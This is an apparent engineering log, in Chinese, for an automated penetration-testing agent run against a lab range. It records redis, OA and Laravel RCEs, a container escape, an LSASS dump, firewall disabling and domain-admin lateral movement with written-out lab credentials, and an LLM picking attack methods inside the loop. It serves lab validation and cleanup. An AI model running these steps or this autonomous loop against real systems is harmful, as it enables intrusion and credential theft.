| 3 `parse` | `cred.pypykatz_parse` | `bunny`（nt + plaintext）、`PC1$`（nt + plaintext） |

其余节点与 D29 同口径：14/12/7/28/30 pass、19 `skip`、2 `graph_gap`、37/47 `or_unmet`、
38/48 `need`（点名 `dc/pc2:domain_administrator`，run 手里是 `PC1$`、`bunny`）。

### 路上修掉的 3 个真缺陷（都在实机暴露，全部带回归测试）

| # | 现象 | 根因 | 修法 |
| --- | --- | --- | --- |
| A | 26 实机提权成功却 `uncertain_stop` | target 闸把容器自报 hostname 当成「另一个主机」 | 运行层注入 `requirement.target_aliases`（仅当会话宿主 == 节点图主机）；checker 并集对账 |
| B | 41 `blocked:need(dump_path)`：链不跑 | `--include-planned` 让链外 planned 卡抢锁，链判定（locked 须是链段）随即失效 | `supply.locked_chain`：链的第一个就绪段接管锁定；node runner 与 dispatch 共用同一判定；`chain.locked` 落进结果 |
| C | 供给记录的会话身份是 `null`（D29 残留） | 三个 provider 读 `judgement["evidence"]`，而判定只给结论 | 统一读 `payload["evidence"]`（`observations(payload)`） |

> node 22（`priv.privileged_container_escape`，planned）如实不动：mount 段在容器内失败、`host_side_marker` 无观测 ——
> 缺口是「`session_ref` 表达不了容器内 root 上下文」，不是方法本身（D24-c2 的结论继续有效）。

### 靶场清理（`D30-cleanup`，脚本 `output/diag/D30/lab_cleanup_d30.py`）

- 容器：`/var/www/html/agv.shell.php` 经同一通道删除，`HTTP 200 → 404` 复核；
- Kali：`/tmp/agv-payloads/agv_http_cmd.py`、`/tmp/agv_recv.log`、`/home/kali/agv-loot/`（`lsass-pc1.dmp` 36,337,346 B）→ `KALI-LEFT-NONE`；
- pc1：`C:\Windows\Temp\agv_lsass.dmp` + `*.agv_oa.shell.png` → `LEFT_TEMP=0 LEFT_OA=0`；
- redis（web1）：遗留键删除 → `DBSIZE=0`；`dir=/root`、`dbfilename=dump.rdb` 已复原。
  **教训**：`--node-context` 的 `cleanup: true` 只复位 redis config、**不删 key**，清理脚本必须带 DEL。
- 跑完四台 VM 全部挂起（`vmrun list` → 0）。

### 回归与索引

- `python -m pytest -q` → **481 passed, 1 skipped**（D29 的 449 → 481）。
- `scripts/build_skill_index.py --check` → 18 skills (13 action / 5 support) @ `3b3a456a7992` + `index check: ok`。

## 会话权限上下文 · D31（2026-09-16）

D30 的遗留头条「节点 22 的容器逃逸卡」在这一轮闭环：**默认路径**下节点 22 由 `blocked:no_method` 变 `succeeded`，
`granted` 多出 `web2: root`。三次实机 run 的轨迹（同一靶场、同一图、同一 node-context）：

| run | 政策 | 结果 | 关键证据 |
| --- | --- | --- | --- |
| `D31-path` | 默认（无逃生门） | 8 succeeded + 1 chain_done / 5 blocked | 与 `D30-path3` **逐行一致**：节点 22 `no_method` 并点名 `priv.privileged_container_escape (planned)`；回归成立 |
| `D31-path2` | `--include-planned` | **9 succeeded** / 5 blocked | 节点 22 **succeeded**：供给链 = webshell 卡 → **提权卡**（`identity_before=www-data` → `root`）→ 逃逸卡本体（宿主侧 marker 写读） |
| `D31-path3` | 默认（两张卡转 implemented 后） | **9 succeeded** / 5 blocked | 与 `D31-path2` 同结果但**不需要逃生门** —— 生产口径 |

### 节点 22：两跳供给 + 一次逃逸

| 步骤 | 谁 | 证据 |
| --- | --- | --- |
| 会话供给（沿用 D30） | `session.webshell_via_laravel`（`supply-26-…/call-20260916T045252-a8fad3`） | 容器通道 www-data / `8e172820ac78`，登记进 `channels.web2_docker` |
| **提权供给（D31 新增）** | `session.root_via_suid`（`supply-22-…/call-20260916T045253-8698df`） | 三步 `find` → `probe`（`identity_before=www-data`）→ `verify`（提权包装里 `id -un` = `root`）；三闸 pass（freshness / target：别名 `8e172820ac78` 对齐 `192.168.52.20` / identity：`observed root is the system tier`）；交回「同一条入口 + `escalate.argv` + `identity=root`」 |
| 逃逸本体 | `priv.privileged_container_escape`（`node-22/…/call-20260916T045253-d27422`） | `mount /dev/sda1 /hello` → 写 `/hello/tmp/agv_host_marker` → 读回 `agvd27422-host-write`；cgroup 行给出 `container_id=8e172820ac78…`（与 assets 的 `container_id_prefix` 一致）；三闸 pass（freshness / target / effect `host_side_marker_present`） |

`run_result` 见证：`channels.web2_docker = {…, escalate:{argv,mode:suid_path,obtained_by:/home/jobs/shell}, identity:root, privilege:system}`、
`sessions[].verified.identity = root`、`granted = {web1:root, pc1:system, web2_docker:root, web2:root}`、
`supplies = [26:webshell, 22:escalate, 41:verify]`；其余节点（14/12/7/28/30/19/41、2 `graph_gap`、37/47 `or_unmet`、38/48 `need`）与 D30 同口径。

### 「默认路径不供给」这件事本身是证据

`D31-path` 里节点 22 停在 `no_method` 而不是 `need`：**没有可选候选 ⇒ 没有 `pending` ⇒ 不会有 need 行**。
（交接摘要里曾预期它会变成 `blocked:need` 并点名提权卡——实测说明那条预期不准确；缺口只在「有候选、但值不够」时才以 need 说话。）
卡片转 `implemented` 之后，同一条默认路径（`D31-path3`）就走通了。

### 路上修掉的 1 个真缺陷（首跑测试抓到，带回归测试）

| # | 现象 | 根因 | 修法 |
| --- | --- | --- | --- |
| A | `EscalationProviderTests` 首跑 1 failed：`KeyError: target_aliases` | 升级 provider 的 requirement 里没有别名 —— 通道本身只写地址与客户端，**对面自报的机器名只存在会话登记里** | 新增 `_with_seen_host(channel, state, name)`：通道没写 host 时用 `session.host` / `verified.host` 补上；`held_channel` 两个分支都过它（语义与节点调用一致：target 闸比的是观测） |

### 靶场清理（`D31-cleanup`，脚本 `output/diag/D31/lab_cleanup_d31.py`）

- 容器：经**运行层自己的通道 + 与卡一致的提权包装**回收 —— 删宿主侧 marker → `umount /hello` → `rmdir` → `rm -rf /tmp/agv-esc` →
  删 `/var/www/html/agv.shell.php`；回显 `AGV_CONTAINER_CLEANED` / `CONTAINER-LEFT-NONE` / `MOUNTPOINT-GONE`，`HTTP 200 → 404`；
- Kali：`/home/kali/agv-loot/lsass-pc1.dmp`（36,208,290 B）、`/tmp/agv_recv.log`、`/tmp/agv-payloads/agv_http_cmd.py` + `agv_oa.shell.png` → `KALI-LEFT-NONE`；
- PC1（OA include 通道）：`TEMP_COUNT 1 → 0`、`OA_COUNT 3 → 0`；
- redis（web1）：`DBSIZE 1 → 0`，`dir=/root`、`dbfilename=dump.rdb` 已复原；
- **宿主侧独立复核**（web2 `192.168.52.20`，直连不经过容器）：`/tmp/agv_host_marker` 不存在、`/hello` 不存在、无 hello 挂载、`/tmp` 无 agv 残留；
- 跑完四台 VM 全部挂起（`vmrun list` → 0，`vmware-vmx` 进程 0）。

### 回归与索引

- `python -m pytest -q` → **508 passed, 1 skipped**（D30 的 481 → 508：新增 `tests/test_identity.py` 11 条、`ChannelPrivilegeTests` 6 条、`test_run.py` 3 条、供给与别名若干）。
- `scripts/build_skill_index.py --check` → 19 skills (13 action / 6 support) @ `6328488a799c` + `index check: ok`；`status_counts = implemented 15 / planned 4`。

## 多 agent 编排（agent 层）· D32（2026-09-16）

D32 加的是**角色层**，不是新卡：`skills/registry.json` 九字段不变，19 条技能一条没改（索引 `19 skills @ 6328488a799c`，
`index check: ok`）。四个角色（planner / verifier / session agent / orchestrator 壳）包在 D27 的运行内核外面，入口
`scripts/run_agent.py`；契约见 [agent 层契约](agent_contract.md)。

### 干跑（默认，不碰靶场）：`D32-plan`

```powershell
python scripts/run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json --run-dir output/runs/D32-plan --assets data/inputs/hongri7/assets.json --host-map data/inputs/hongri7/host_ip_map.csv --control 192.168.52.128
```

产物 `agent_plan.json`：**14 步**（11 `run_node` + 1 `skip_node`(19) + 2 `aggregate`(37/47)），每步 `simulated: true`，
16 条假设 note（`supply assumed for node …` 与节点 2 的 `graph gap crossed … misses credential_ref`），结尾 `walk stops: done_all`。
一条命令都没发，一个 state 都没写。

### 实机三跑（Kali / Web 1 / Web 2 / PC 1 四台在线）

| run | 口径 | 结果 | 说明 |
| --- | --- | --- | --- |
| `D32-live` | 首次接线（`--live`，precheck 上线） | 9 succeeded（含 1 skip）/ 5 blocked | 与 `D31-path3` **逐节点相同**；首跑暴露缺陷 ①（见下） |
| `D32-live2` | 修缺陷 ① 后复跑 | 9 succeeded / 5 blocked | 同样逐节点相同；`node_reviews` 8 个节点全 `holds`；复盘这批数据时发现缺陷 ② |
| `D32-live3` | 修缺陷 ② 后复跑（**头条 run**，46 秒） | 9 succeeded / 5 blocked | 逐节点与 `D31-path3` 相同；节点 41 不再出现「端口 none」的假探针行 |

复现命令（`D32-live3`）：

```powershell
$env:AGV_SSH_PASSWORD="kali"
python scripts/run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json --run-dir output/runs/D32-live3 --remote kali@192.168.52.128 --password kali --assets data/inputs/hongri7/assets.json --host-map data/inputs/hongri7/host_ip_map.csv --control 192.168.52.128 --node-context output/runs/D29-node-context.json --timeout 60 --live
```

### 与 D31 基线的一致性（回归判据）

| 项 | `D31-path3`（生产口径基线） | `D32-live3` |
| --- | --- | --- |
| 节点状态 | 9 succeeded（含 1 `skip_node`）/ 5 blocked | **逐节点相同** |
| blocked 明细 | 2 `graph_gap`；38 / 48 `need credential`；37 / 47 `or_unmet` | 相同 |
| `granted` | `{web1: root, pc1: system, web2_docker: root, web2: root}` | 相同 |
| 手上凭据 | `bunny` + `PC1$`（节点 41 产出） | 相同 |
| `graph_gaps[]` | 节点 2 | 相同 |
| 决定数 | — | 15 条 |

### `run_result.agent` 段（`D32-live3` 实测读数）

| 字段 | 读数 |
| --- | --- |
| `policy` | `{dry_run: false, precheck_live: true, include_planned: false, max_steps: null}` |
| `steps` | 15 条决定轨迹 |
| `prechecks` | 9 个节点、共 30 行前置（见下表） |
| `verdicts` | 10 条复核，**全部 `go`**（节点 41 三段各一条） |
| `providers` | 5 条供给路径决策 |
| `node_reviews` | 8 个节点，全 `holds` |
| `run_status` / `run_action` | `blocked` / `blocked` |

### 前检查（最小必要验证）实机读数

| 节点 | `reach`（program，真探针） | `service`（graph） | `privilege`（logic） | `credential`（logic） | `method`（logic） |
| --- | --- | --- | --- | --- | --- |
| 2 | `missing` —— `nc -z 192.168.93.30 445` rc=1（dc 在本次网络里不可达） | unknown | — | — | **`missing`（候选缺 `credential_ref`）** |
| 7 | `ok` —— `192.168.52.30:8080` open | unknown | unknown（此刻手上没有 pc1 会话） | — | `ok`（1 候选就绪） |
| 12 | `ok` —— `192.168.52.10:6379` | unknown | unknown | — | `ok` |
| 14 | `ok` —— `192.168.52.10:6379` | — | — | — | `ok` |
| 22 | — | unknown | unknown（此刻手上没有 web2 会话） | — | `ok` |
| 26 | — | unknown | **`missing`（held=user，wanted=root）** | — | `ok` |
| 28 | `ok` —— `192.168.52.10:81` | unknown | unknown | — | `ok` |
| 30 | `ok` —— `192.168.52.10:81` | — | — | — | `ok` |
| 41 | （图未声明端口，无此行——缺陷 ② 修好后） | unknown | `ok`（held=system） | **`missing`（pc1:domain_administrator）** | `ok`（2 候选就绪） |

读法：`reach=ok` 是**真探针**说的；`service=unknown` 是「图声明了但线上还没开口」——这不是缺陷，是口径
（漏洞在不在由这次攻击自己回答）。节点 26 的 `privilege=missing` 恰好说明 precheck 不阻断：它记录「现在是 user」，
节点照样开跑，卡自己把通道升到 root。节点 41 的 `credential=missing` 与 `needs[]` 的 `38/48` 是同一件事的两面。

### 供给路径决策（`agent.providers`，5 条）

| 节点 | need | provider | 决策理由（原文摘要） |
| --- | --- | --- | --- |
| 26 | session | `webshell` | 手上没有通道，而 `web2_docker` 是经发布端点可达的容器 |
| 22 | session | `escalate` | 手上有 `web2_docker` 通道但等级 `none`/`user`，卡要求 `system` |
| 41 | session | `verify` | pc1 通道已持有，先复验（`post.channel_echo`）再用 |
| 38 | credential | `verify` | 同上（拿通道去核凭据）；核完仍缺 `dc:domain_administrator` ⇒ 如实 `blocked:need` |
| 48 | credential | `verify` | 同上（`pc2:domain_administrator`） |

### 首跑与复盘抓到的 2 个真缺陷（都已修复 + 回归测试）

| # | 现象（实测） | 根因 | 修法 |
| --- | --- | --- | --- |
| ① | `D32-live` 的 `node_reviews` 把**成功**的节点（12/14/22/26/28/30/41/7）全标成 `method_short`，note 还写 "attempts failed on their own terms" | `verifier.summarize` 只看有没有 fail 行，「全是 go」落进了 else 分支 | 全 go ⇒ `pattern=holds`（新增分支）；顺带把 go 的理由从「every review row holds」改成「no review row failed（unresolved: …）」——有一行 `unknown` 时不许宣称全成立。+2 条测试 |
| ② | 节点 41 的前置行是 `nc -z -w 3 192.168.52.30 none` ⇒ `invalid port none`，判定却写 `missing`（假读数） | 图在「规则没写端口」时把端口写成字符串 `none`，planner 只挡了 `None`/空串 | 端口必须 `isdigit()` 才生成 `reach` 行（没有观测比假观测诚实）。+1 条测试 |

两次修复后：**545 passed, 1 skipped**（D31 基线 508 → D32 首轮 542 → 现在 545）。

### 靶场清理（`D32-cleanup`，复用 `output/diag/D31/lab_cleanup_d31.py`）

- 容器（经运行层自己的通道 + 与卡一致的提权包装）：`HTTP_BEFORE=200` → 删宿主侧 marker → `umount /hello` → `rmdir` →
  删提权 helper 目录 → 删 `agv.shell.php` → **`HTTP_AFTER=404`**，回显 `AGV_CONTAINER_CLEANED` / `CONTAINER-LEFT-NONE` / `MOUNTPOINT-GONE`；
- Kali：loot（36.35MB `lsass-pc1.dmp`）、`/tmp/agv_recv.log`、`agv_http_cmd.py`、`agv_oa_http.py`、`agv_oa.shell.png` → `KALI-LEFT-NONE`（`/tmp/agv-payloads` 空）；
- PC1（OA include 通道）：`TEMP_COUNT 1→0`（`agv_lsass.dmp` 36.35MB）、`OA_COUNT 1→0`；
- redis（web1）：`DBSIZE 1→0`，`config dir=/root`、`dbfilename=dump.rdb` 原样；
- VM：四台全部 suspend（`vmrun list` = 0，`vmware-vmx` 进程 0）。

### 本批回归与索引

- `python -m pytest -q` → **545 passed, 1 skipped**（新增 `tests/test_agents.py` 37 条：契约 / 规划 / 复核 / 会话 / 编排）；
- `python scripts/build_skill_index.py --check` → `registry: 19 skills (13 action / 6 support) @ 6328488a799c` + `index check: ok`。

**仍然开着的口子（D32-h）**：① 节点 2 的 `graph_gap`（缺 `credential_ref`，要回图侧补事实）；② 节点 41 的解析链只产出
`bunny` / `PC1$`，没有域管材料 ⇒ 38 / 48 停在 `need credential`。两条都是**输入侧**的问题，agent 层如实报告，不假装能修。

---

## D32-h 验证（2026-09-16）：图侧补凭据 + 实机全绿，路上抓到两个真缺陷

这一批把 D32-g 收尾时点名的两条**输入侧**口子闭掉第一条（节点 2 的图缺口），第二条（节点 41 解析链拿不到域管）改成
**显式的运行输入 + 明写技能缺口**。整图因此第一次跑到 `run: succeeded via done_all`。

### 0. 预检（先证明「凭据不是编的」）

六台 VM 启动后（kali / Web1 / Web2 / PC1 / PC2 / DC，27.5 秒），先用 `output/diag/D32/preflight_d32h.py` 探：

| 检查 | 结果 |
| --- | --- |
| ping 五台（.52.10/.20/.30、.93.30/.40） | 全通（kali 有到 93.x 的路由） |
| 端口 | `web1:81 open`、`web1:6379 open`（`redis-cli ping → PONG`）、`pc1:8080 open`、`pc1:445 open`、`dc:445 open`、`web2:8000 open` |
| 洁净度 | `/tmp/agv-payloads/` 空、`http://192.168.52.30:8080/agv.shell.php` = 404 |
| 工具 | `/opt/agv/tools/` 四个固定件在位 |

域管凭据**实测有效**（独立于 writeup 的复现）：

```
crackmapexec smb 192.168.93.30 -u Administrator -p Whoami2021 -d WHOAMIANONY
  SMB 192.168.93.30 445 DC  [*] Windows Server 2012 R2 Datacenter 9600 (name:DC) (domain:WHOAMIANONY)
  SMB 192.168.93.30 445 DC  [+] WHOAMIANONY\Administrator:Whoami2021 (Pwn3d!)
crackmapexec smb 192.168.93.40 -u Administrator -p Whoami2021 -d WHOAMIANONY
  SMB 192.168.93.40 445 PC2 [*] Windows 7 Professional 7601 SP1 (name:PC2) (domain:WHOAMIANONY)
  SMB 192.168.93.40 445 PC2 [+] WHOAMIANONY\Administrator:Whoami2021 (Pwn3d!)
```

预检里有一个口径修正值得记：redis 的 `execution_host` 是 **web1**（`assets.json` 的 `endpoints.redis.connect_ip` 写的是原始 writeup 地址
`192.168.1.103`，本地部署对应 `192.168.52.10`；图节点 12/14 的 dst 也是 `web1:6379`，互相印证）。`host_ip_map.csv` 只有 5 行
（pc1/web1/web2/pc2/dc），不含 web2 的 93.10、pc1 的 93.20、web1 的 1.103 —— 这是「一张主机多 IP」对账表的已知边界。

### 1. 输入侧改动：图补凭据 + 显式运行输入

**① 图侧**：`rules5_v2.P` 的 `RULE 12` 就地补凭据前提，新增 case `disable_firewall_credentialed`；原因、sha、编号位移表见
[rules5_v2 说明](rules5_v2_windows_lateral.md) 的 D32-h 节。

**② 运行输入**：域管凭据作为**显式运行输入**供给（不伪造、不假装解析链拿到了它）：

| 文件 | 提交？ | 内容 |
| --- | --- | --- |
| `data/inputs/hongri7/run_context.domain_admin.json` | 否（`.gitignore`） | 真实口令 `WHOAMIANONY\Administrator` + `provenance`（写清来自 2026-09-11 writeup 复刻的 mimikatz 证据，指向 `hongri7_writeup_validation_audit.md`） |
| `data/samples/hongri7_run/run_context.demo.json` | 是 | 同一形状的**合成模板**（DEMO / PLACEHOLDER），新靶场照抄这份 |

**③ 技能缺口（D32-h 的第三条，如实记录）**：节点 41 的方法链（dump → exfil → `cred.pypykatz_parse`）在实机上只解析出
`bunny`（Bunny2021）与机器账户 `PC1$`，**没有域管材料**；域管明文来自 2026-09-11 writeup 复刻的 `sekurlsa::logonpasswords`。
本批不改解析卡、不伪造观测：域管做显式输入，来源与证据写在上面那份 context 的 `provenance` 字段里，并在 `run_result.json` 的
`assumptions[]` 留痕（第三跑 35 条）。「解析链为什么拿不到域管」作为技能缺口进[技能补卡清单](skill_backlog.md)。

### 2. 第一跑（`D32h-live`）：暴露缺陷①「会话探针瞄错主机」

命令（`--timeout 60`，带 `--context` 与 `--node-context`）：

```
python scripts/run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json --run-dir output/runs/D32h-live
  --remote kali@192.168.52.128 --password kali --assets data/inputs/hongri7/assets.json
  --host-map data/inputs/hongri7/host_ip_map.csv --control 192.168.52.128
  --node-context output/runs/D29-node-context.json --context @data/inputs/hongri7/run_context.domain_admin.json
  --timeout 60 --live
```

结果：7 个节点实机通过（`12`/`14`/`7`/`30`/`28`/`26`/`22`）+ 2 个 skip，**节点 2/44/48 全部卡在 `need`**：

```
post.channel_echo judged uncertain: target: observed target (session_host=PC1)
cannot be aligned with the node target (target_host=192.168.93.30)
```

**根因**：会话供给把 requirement 的 `target_host` 设成了**节点目标**（dc 的 `192.168.93.30`），而通道探针只能观测到**通道宿主**（pc1 回报 `PC1`）。
为什么以前没暴露：`D32-live3` 的节点 41 是**同主机**（pc1→pc1），通道宿主恰好等于节点目标，侥幸对齐；换成跨主机必然对不上。

**修法**（`scripts/run_path.py`）：新增 `channel_address(host, fallback, selection)`（解析顺序：host map → 选择器已解析的 `facts.source_ip` → 调用方 fallback）
与 `session_requirements(node, host, address, *, level, seen)`（`target_host` = 通道宿主地址、`source_host` / `target_graph_host` = 通道宿主逻辑名、
`seen` 才带 `target_aliases`）；`verify_channel` 与 `escalate_session` 都改用它，`run_supply` 统一算 `session_host` / `session_address`。
语义依据一句话：**会话卡的观测对象只能是它自己的通道对端**。回归测试 +3 条（20→23）。

### 3. 第二跑（`D32h-live2`）：暴露缺陷②「凭据的登录名被角色名顶替」

同命令。节点 2/44/48 全部**真的调用了卡**（问题从会话变成方法）：

- 节点 44/48（`exec.wmic_remote_cmd`）53.9s / 55.3s 返回，`stdout` 里 `AUTH_RC=2` + `登录失败: 未知的用户名或错误密码`，
  于是 target / identity 两闸都没有观测 → `uncertain`；
- 根因：`inputs.json` 的 `credential_ref = {"user":"domain_administrator", …}` —— 卡拿 `net use /user:WHOAMIANONY\domain_administrator` 去登录，
  **把图里的账户角色名当成了登录名**。对照证据：`D24-e-wmi` 里同卡跑通时用的是 `WHOAMIANONY/Administrator:Whoami2021`（AUTH_RC=0，9.4s / 24.5s）。
- 代码定位：`src/skills/selector.py::_credential_from_facts` 的 `resolved = {"user": user, …}`，`user` 取的是 `facts["account_user"]`（MulVAL 角色名），
  没有用凭据条目自带的登录名。修法：`login = str((entry or {}).get("user") or user)` —— **条目自己声明的登录名优先，图角色名兜底**；
  图角色名仍然是 run 查表的 key（`credential_entry` / `sweep_credentials` 不受影响）。回归测试 +1 条。
- 同一跑还确认了一件事（**不是缺陷**）：节点 2 的卡在 `--timeout 60` 下超时（60.0s，stdout 0 字节）——
  卡自己写着 `DEFAULT_TIMEOUT = 240`，内部还有 `SETTLE_SECONDS = 8` 的等待，再加 WMI 创建与回读，60 秒对这个方法本来就偏紧。第三跑改成 `--timeout 180`。

### 4. 第三跑（`D32h-live3`）：`succeeded via done_all`（头条）

命令与第二跑相同，仅 `--timeout 60 → 180`；**耗时 45.8 秒，exit=0**。

`run_result.json`：`status=succeeded`、`action=done_all`、`reason=every node is settled and every AND node succeeded`、
**`graph_gaps=[]`、`skill_gaps=[]`**、inventory 13 个事实被证明、35 条 assumption。

| 节点 | 语义 | 结果 | 实测证据 |
| --- | --- | --- | --- |
| 14 | attacker → web1:6379（Direct Network Access） | `done` | `pre.nmap_tcp_probe`（freshness/target/effect 全过） |
| 12 | redis 未授权写（T1190，web1） | `done` | `exploit.redis_unauth_write` |
| 7 | OA include 命令回显（T1623，web1→pc1:8080） | `done` | `exploit.tongda_oa_include_rce` |
| 5 | LSASS 转储（T1003.001，pc1） | `skip` | effect 已被上游证明（4），无需动作 |
| **2** | **远程关防火墙（T1562.001，pc1→dc）** | **`done`（24.3s）** | marker 命中；`target_host=192.168.93.30` 对齐；effect：目标自报 **`EnableFirewall=disabled`**（state only, no change claimed） |
| 30 | attacker → web2_docker:81（发布端点） | `done` | `pre.nmap_tcp_probe` |
| 28 | Laravel Ignition RCE（CVE-2021-3129） | `done` | `exploit.laravel_ignition_rce` |
| 26 | SUID 路径劫持（T1574.007） | `done` | `priv.suid_path_hijack`（freshness/target/identity 全过） |
| 22 | 容器逃逸（T1068，web2_docker→web2） | `done` | `priv.privileged_container_escape` |
| 19 | 第二条命令解释器路径（T1623，web2→pc1:8080） | `skip` | effect 已被上游证明（6） |
| **44** | **pc1 → dc 凭据横向（T1021，445）** | **`done`（8.9s）** | `hostname=DC`、`identity_name=whoamianony\administrator`、SID `S-1-5-21-…-500` |
| 43 | `execCode(dc,system)` 聚合 | `aggregate` | fact 已证，聚合自动 settle |
| **48** | **pc1 → pc2 凭据横向（T1021，445）** | **`done`（9.0s）** | `hostname=PC2`、同一域管身份与 SID |
| 47 | `execCode(pc2,system)` 聚合 | `aggregate` | fact 已证，聚合自动 settle |

三条决定性判定原文（都在对应 call 目录的 `judgement.json` 里）：

```
node 2  effect pass :: the target reports EnableFirewall=disabled after the call (state only, no change claimed)
node 44 target pass :: observed hostname=DC aligns with the node target (target_host=192.168.93.30)
node 48 target pass :: observed hostname=PC2 aligns with the node target (target_host=192.168.93.40)
```

也就是说：**「关 dc 防火墙 → 用域管打 dc → 用域管打 pc2」这条链是同一跑里真机串起来的**，不是模拟。

### 5. 靶场清理与 VM 挂起

三次实跑各清一次，最后一次（`D32h-live3`）：容器 `HTTP_BEFORE=200 → HTTP_AFTER=404`（`AGV_CONTAINER_CLEANED` / `CONTAINER-LEFT-NONE` / `MOUNTPOINT-GONE`）；
Kali `KALI-LEFT-NONE`；PC1 `TEMP 3→0`（三个 `agv_agv*_wmic.txt`，160 字节）与 `OA 1→0`；redis `DBSIZE 1→0`（`config dir=/root`、`dbfilename=dump.rdb` 原样）。
六台 VM 随后全部 `vmrun suspend`，`vmrun list` = **0**。

### 6. 本批回归与索引

- `python -m pytest -q` → **549 passed, 1 skipped**（D32-f/g 的 545 → 本批 +4：会话供给 3 条 + 凭据登录名 1 条）；
- `python scripts/build_skill_index.py --check` → 19 skills（13 action / 6 support）+ `index check: ok`（cases 10）；
- 三 profile 图重生成：全 `unmatched_and_nodes=[]`。

## D37 验证（2026-09-16）：模型接缝上真机 —— 三个接缝各拿到一次实机问答

**环境**：六台 VM 全在线（kali / Web 1 / Web 2 / PC 1 / PC 2 / DC）。web2 的 redis 不自启动，跑前手工拉起：
`sudo -S sh -c 'cd /root && redis-server --daemonize yes --bind 0.0.0.0'`（redis 2.8.17 **没有** `protected-mode` 指令，
写进参数会 FATAL；核对 `config dir = /root`、`PING = PONG`）。预检 `output/diag/D32/preflight_d32h.py` 全通
（web1-81:200 / pc1-8080:200 / dc-445 open / oa-shell:404）。模型端冒烟：DeepSeek `https://api.deepseek.com/v1`，
`deepseek-v4-pro` 可用（推理模型；不启用 JSON 模式时 `content` 可能为空）。

### 1. `D37-live`：模型接缝首跑（64.4 s）

```powershell
D:\Conda\python.exe scripts\run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json `
  --run-dir output/runs/D37-live --remote kali@192.168.52.128 --password kali `
  --assets data/inputs/hongri7/assets.json --host-map data/inputs/hongri7/host_ip_map.csv `
  --control 192.168.52.128 --node-context output/runs/D29-node-context.json `
  --context "@data/inputs/hongri7/run_context.domain_admin.json" --timeout 180 --live `
  --model deepseek-v4-pro --model-base-url https://api.deepseek.com/v1 --model-api-key-env DEEPSEEK_API_KEY
```

读数：`status=succeeded` / `action=done_all` / `graph_gaps=[]` / `skill_gaps=[]`；14 个输出节点全 settled
（2/7/12/14/22/26/28/30/44/48 `done`、5/19 `skip`、43/47 `aggregate`）。
`agent.model` = `calls=5`、`summary={"answered":5,"rejected":0,"ran_from_rules":0}`，**5 行全是 `choose_provider`，
而且菜单都是单选项**（`['none'] ['none'] ['verify'] ['webshell'] ['escalate']`，transcript 在 `output/runs/D37-live/model/`）。
`pick_method` 一次没触发：那次跑的 10 个节点 `selection.json` 全 `ready=1`（替代卡都是 `planned`），
接线在但闸门没放行 —— 这条现场直接催生了下一条。

### 2. `D37-live2`：补上菜单闸门后 + `--include-planned`（103 s）

比上一跑多一个 `--include-planned`（其它参数相同，run-dir 改 `output/runs/D37-live2`）。

| 读数 | 值 |
| --- | --- |
| 运行结论 / 退出码 | `succeeded via done_all` / `EXITCODE=0`（显式打印复核） |
| 节点 | 14/14 settled，与 `D37-live` 逐节点一致 |
| provider 提问 | **0 次**（闸门生效：本图每个 provider 菜单都只有一行） |
| `pick_method` 提问 | **6 次**（节点 2 三次、44 一次、48 一次，另 1 次空回答被拒） |
| `agent.model.summary` | `{"answered":5,"rejected":1,"ran_from_rules":1}` |

三张菜单实况（transcript 目录 `output/runs/D37-live2/model/`，本轮 6 份全是 `model-NNN-pick_method.json`）：

- 节点 2（2 行）：`evasion.netexec_firewall_off`（planned，technique+case）与
  `evasion.wmi_firewall_off`（implemented，case）→ 模型选 planned 那张，**内核真跑了它**：
  `node-2/attempt-1-evasion.netexec_firewall_off/call-20260916T072435-afb4ef` `status=tool_missing`、`rc=127`
  （执行主机没有 `netexec`）→ freshness 闸拦下 → 循环换下一张卡 → `attempt-2-..._wmi` pass → 节点 `done`；
- 节点 44 / 48（各 3 行）：`exec.wmic_remote_cmd`（implemented）在前，`psexec` / `wmiexec`（planned）在后
  → 模型两次都选 implemented 那张，与规则一致；
- 拒绝路径（真模型）：`model-004-pick_method.json` `reply.ok=false` `error=the model returned no content`
  （`completion_tokens == 900 == max_tokens`）→ `rejected` 落记录、`source=rules`、规则的答案照跑。

### 3. 接缝见证（故障注入，真机）：`prefer_repair`

健康靶场永远不会让调用「停滞」，而 `prefer_repair` 只在「停滞 + 还有下一张卡」时才被问（菜单两行）。所以要见证它，
必须注入唯一那一个条件：把单次调用超时压到一个 SSH 往返以下。脚本 `output/diag/D37/seam_witness_prefer_repair.py`
用的是生产接线（`run_path.build_node_runner` + `orchestrator.make_attempt_reviewer`，与 `run_agent.py` 同两条），
只多两件事：`--include-planned`（菜单才有 3 张卡）和注入的超时。**超时是调用侧的**：远端命令不会跑完，靶场状态不变。

| 见证 | 命令要点 | 读数 |
| --- | --- | --- |
| `witness-prefer-repair` | `--node 44 --timeout 0.4` | 第 2 次 attempt（psexec）超时 → 菜单 `['retry','next_method']` → 真模型那次**空回答被拒** → 规则的 `retry` 照跑 |
| `witness-prefer-repair2` | `--node 44 --timeout 0.4` | 三次调用都在 0.4 s 内结束（没有停滞）→ 菜单 1 行 → **一次都没问**（闸门的反向见证） |
| `witness-prefer-repair3` | `--node 44 --timeout 0.01` | 6 次 attempt 全部 `timeout`/`transport_error` → **6 次提问、菜单全是 `['retry','next_method']`**、模型 6 次都答 `retry`；其中 model-002 `attempts=3` 是本次空回答重试的实机恢复，model-003/004 连空三次被拒 → 规则动作照跑 |

### 4. 本批抓到的四个问题

| # | 问题 | 证据 | 处置 |
| --- | --- | --- | --- |
| A | 单选项菜单也在问模型（橡皮图章） | `D37-live` 5 次 provider 问答、12.8 s、信息量 0 | 三个接缝统一「菜单 ≥2 才问」（decisions D37 决策 1） |
| B | 空回答（推理模型烧预算）每次都退化成拒绝 | `D37-live2` model-004、witness-1 model-001；A/B 概率性复现 | 传输层有界重试 + 预算 900→1600 + `--model-max-tokens`（决策 3） |
| C | 退出码 1 而 run 是 `succeeded` | 只出现过一次，本 turn 复现不出 | 按未复现观察记录；复核入口写死（决策 4） |
| D | `run_result.nodes[].skill` 恒为空 | 与 `D32h-live3` 同形 | 不是回退；方法名在 `reason` / `attempts[].skill_id` / `selection.json` |

### 5. 靶场清理与 VM 挂起（D37 收尾）

复用 `output/diag/D31/lab_cleanup_d31.py output/runs/D37-live2 container kali pc1 redis`；
六台 VM `vmrun suspend`，`vmrun list` = 0。（读数见 PROGRESS 的 D37 收尾条。）

### 6. 本批回归与索引

